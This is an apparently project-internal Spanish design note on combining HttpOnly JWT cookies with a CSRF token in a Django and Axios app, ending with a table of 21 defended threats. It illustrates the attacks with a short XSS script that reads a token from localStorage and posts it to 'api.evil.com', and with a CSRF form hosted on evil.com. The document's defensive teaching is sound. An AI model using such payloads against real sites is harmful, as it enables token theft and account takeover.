# Balance JWT + CSRF: por qué usar ambos

## El dilema

| Estrategia | Protege de | Expone a |
|------------|------------|----------|
| JWT en `localStorage` | CSRF (no hay cookies que enviar) | **XSS** — cualquier script puede leer `localStorage` y robar tokens |
| JWT en cookies HttpOnly | **XSS** — `document.cookie` no accede a HttpOnly | CSRF — el navegador envía cookies automáticamente en cada request |

Ninguna de las dos estrategias por sí sola es suficiente. La solución del proyecto es combinarlas: cookies HttpOnly para los tokens **+** CSRF token para verificar la intencionalidad del request.

---

## Escenario A: localStorage sin CSRF

```python
# Login — backend devuelve tokens en el body
def post(self, request):
    ...
    return Response({
        "access": str(access_token),
        "refresh": str(refresh_token),
    })
```

```ts
// Frontend guarda en localStorage
const data = await api.post('/api/auth/login/', payload);
localStorage.setItem('access_token', data.access);
```

**Ataque XSS:**

```html
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://api.evil.com/steal', { method: 'POST', body: token });
</script>
```

**Resultado:** ❌ El atacante roba el token y tiene acceso permanente. El refresh token también está comprometido.

---

## Escenario B: Cookies HttpOnly sin CSRF

```python
# Login — backend setea cookie HttpOnly
response.set_cookie(
    key="access_token",
    value=str(access_token),
    httponly=True,
    samesite="Lax",
)
```

```ts
// Frontend — Axios con withCredentials
const api = axios.create({ withCredentials: true });
```

**Ataque CSRF:**

```html
<!-- evil.com -->
<form action="https://tusitio.com/api/usuarios/" method="POST">
  <input name="username" value="atacante" />
  <input name="password" value="1234" />
  <input name="email" value="atacante@evil.com" />
  <button type="submit">Haz clic aquí</button>
</form>
```

La víctima hace clic, el navegador envía las cookies automáticamente, y el backend crea un usuario malicioso.

**Resultado:** ❌ Cualquier sitio externo puede suplantar al usuario porque las cookies se envían solas.

---

## Escenario C: Cookies HttpOnly + CSRF (solución actual)

```python
# Login — backend setea 3 cookies
response.set_cookie("access_token", ..., httponly=True)  # No accesible desde JS
response.set_cookie("refresh_token", ..., httponly=True) # No accesible desde JS
response.set_cookie("csrftoken", ..., httponly=False)    # LEGIBLE por JS — necesaria para CSRF
```

```ts
// Frontend — Axios configura CSRF automático
const api = axios.create({
  withCredentials: true,         // Envía cookies HttpOnly
  withXSRFToken: true,           // Activa CSRF automático
  xsrfCookieName: 'csrftoken',   // Lee esta cookie
  xsrfHeaderName: 'X-CSRFToken', // Y la envía como este header
});
```

### XSS falla

```html
<script>
  document.cookie;            // "csrftoken=abc123" — SOLO la cookie no HttpOnly
  localStorage.getItem('access_token'); // null — nunca se guardó ahí
  // El atacante no tiene access_token ni refresh_token
</script>
```

### CSRF falla

```html
<!-- evil.com -->
<form action="https://tusitio.com/api/usuarios/" method="POST">
  ...
</form>
```

El browser envía las cookies de `tusitio.com`, incluyendo `csrftoken=abc123`. Pero `evil.com` **no puede leer `document.cookie` de `tusitio.com`** (restricción de same-origin). Sin el valor del CSRF token, no puede armar el header `X-CSRFToken`. El backend rechaza el request.

**Resultado:** ✅ El sistema sobrevive a ambos ataques simultáneamente.

---

## Diagrama de flujo

```
Login → Backend setea 3 cookies
         • access_token  (HttpOnly, SameSite=Lax)
         • refresh_token (HttpOnly, SameSite=Lax)
         • csrftoken     (LEGIBLE, SameSite=Lax)
         ↓
Request autenticado (Axios):
         ↓
  ┌──────────────────────────────────┐
  │ Browser envía TODAS las cookies  │ ← automático (withCredentials)
  │ automáticamente en cada request  │
  └──────────────────────────────────┘
         ↓
  ┌──────────────────────────────────┐
  │ Axios lee cookie "csrftoken"     │ ← automático (xsrfCookieName)
  │ y la envía como header           │
  │ "X-CSRFToken"                    │
  └──────────────────────────────────┘
         ↓
Backend:
  1. Extrae access_token de request.COOKIES → valida JWT → autentica
  2. Compara X-CSRFToken header con cookie → valida CSRF → autoriza
```

---

## Conclusión

JWT + CSRF juntos no es redundancia: son dos capas de defensa que resuelven vectores de ataque distintos. El costo de implementación es mínimo:

| Frontend | Backend |
|----------|---------|
| `withCredentials: true` | `CsrfViewMiddleware` (ya viene en Django) |
| `xsrfCookieName` + `xsrfHeaderName` | `csrf_protect` decorator en vistas clave |
| Interceptor de refresh (10 líneas) | `SameSite=Lax` en todas las cookies |
| | `CSRF_TRUSTED_ORIGINS` whitelist |

A cambio, se elimina el peor escenario de seguridad en SPAs: **robo permanente de tokens via XSS**.

---

## Anexo: Los 21 ataques defendidos

| # | Ataque / Amenaza | Mecanismo de defensa |
|---|---|---|
| **Middleware** | | |
| 1 | Cross-Site Request Forgery (CSRF) | `CsrfViewMiddleware`, `csrf_protect` decorator, `SameSite=Lax`, header `X-CSRFToken` |
| 2 | Clickjacking / UI Redressing | `XFrameOptionsMiddleware` → `X-Frame-Options: DENY` |
| 3 | Content Sniffing / MIME Confusion | `SecurityMiddleware` → `X-Content-Type-Options: nosniff` |
| 4 | Reflected XSS (Cross-Site Scripting) | `SecurityMiddleware`, cookies HttpOnly bloquean acceso JS a tokens |
| 5 | Referrer Leakage | `SecurityMiddleware` → `Referrer-Policy: same-origin` |
| **Cookies seguras** | | |
| 6 | Session Hijacking vía robo JS de tokens | `HttpOnly=True` en access_token y refresh_token |
| 7 | Session Hijacking vía MITM (red insegura) | `Secure=True` en producción → solo se envían por HTTPS |
| 8 | CSRF cross-site vía SameSite | `SameSite=Lax` en todas las cookies |
| **Transporte** | | |
| 9 | SSL Stripping | `SECURE_SSL_REDIRECT = True` en producción |
| 10 | MITM / Eavesdropping | HTTPS forzado, contraseñas de DB por variable de entorno |
| **Autenticación JWT** | | |
| 11 | Token Theft (robo de JWT) | Tokens en cookies HttpOnly (nunca en URL, body, ni localStorage) |
| 12 | Token Reuse (refresh token robado y reusado) | `BLACKLIST_AFTER_ROTATION = True` |
| 13 | Sesión sin cierre (logout inefectivo) | `LogoutView` blacklistea refresh token y elimina todas las cookies |
| 14 | Token sin expiración (ventana de compromiso infinita) | `ACCESS_TOKEN_LIFETIME = 60 min`, `REFRESH_TOKEN_LIFETIME = 7 días` |
| 15 | Acceso no autenticado a endpoints | `permission_classes = [IsAuthenticated]` en todos los ViewSets |
| **Red / Origen** | | |
| 16 | DNS Rebinding / Host Header Injection | `ALLOWED_HOSTS` restrictivo |
| 17 | Ataques CORS (origen cruzado malicioso) | `CORS_ALLOWED_ORIGINS` whitelist (sin wildcards) |
| 18 | CSRF desde orígenes no autorizados | `CSRF_TRUSTED_ORIGINS` whitelist |
| **Contraseñas / Credenciales** | | |
| 19 | Fuerza bruta / contraseñas débiles | 4 validadores: similitud con usuario, longitud mínima, contraseñas comunes, solo numéricas |
| 20 | Exposición de Secret Key | `SECRET_KEY` leída de variable de entorno `DJANGO_SECRET_KEY` |
| **Código / Input** | | |
| 21 | Escalación de privilegios (CRUD no autorizado) | `IsAuthenticated` + DRF `ModelViewSet` con permisos a nivel de modelo |
| *Bonus* | Information Disclosure vía debug | `DEBUG = False` en producción |
| *Bonus* | Log Injection / monitoreo | Logging en nivel `WARNING` en producción |
